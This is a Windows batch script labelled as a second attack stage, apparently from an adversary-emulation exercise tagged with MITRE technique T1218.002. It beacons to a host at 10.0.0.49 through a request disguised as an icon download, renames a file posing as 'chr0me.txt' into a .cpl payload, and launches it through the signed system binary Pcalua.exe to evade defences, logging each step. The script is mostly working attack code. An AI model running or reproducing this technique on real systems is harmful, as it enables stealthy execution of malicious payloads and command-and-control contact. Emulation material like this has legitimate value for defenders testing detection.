@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\8841\a1d44cf7
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8841-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=chr0me.txt
SET rgnpbq=8841
SET logfile=%APPDATA%\!fkesh!\macula-simulations.log
SET tempdir=%APPDATA%\!fkesh!
SET uni_exec=Pcalua.exe
SET targetfile=pcafile.cpl
SET csxdv=1
SET reijk=
SET crcfd=!douyiw!\!ecrfwq!
SET qypmn=!douyiw!\!targetfile!

echo [%DATE% %TIME%][DEBUG][!eykalkg!]: stage2_bat_initialized>> "!logfile!" 2>nul
curl -k -s -o nul "!frytcn!"
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: heartbeat_sent>> "!logfile!" 2>nul

IF EXIST "!crcfd!" (
    move /Y "!crcfd!" "!qypmn!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        echo [%DATE% %TIME%][DEBUG][!eykalkg!]: file_renamed_success>> "!logfile!" 2>nul
        SET csxdv=1
        SET reijk=
    ) ELSE (
        echo [%DATE% %TIME%][DEBUG][!eykalkg!]: file_rename_failed>> "!logfile!" 2>nul
        SET csxdv=0
        SET reijk=move_failed
    )
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!eykalkg!]: source_missing>> "!logfile!" 2>nul
    SET csxdv=0
    SET reijk=source_not_found
)

echo [%DATE% %TIME%][DEBUG][!eykalkg!]: dll_load_start>> "!logfile!" 2>nul
!uni_exec! -a "!qypmn!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [%DATE% %TIME%][DEBUG][!eykalkg!]: dll_load_success>> "!logfile!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!eykalkg!]: dll_load_failed>> "!logfile!" 2>nul
    IF !csxdv! EQU 1 SET reijk=exec_failed
    SET csxdv=0
)

echo [%DATE% %TIME%][!eykalkg!]: !fkesh!-!rgnpbq!-T1218.002|Signed Binary Proxy Execution=!csxdv!:!reijk!>> "!logfile!" 2>nul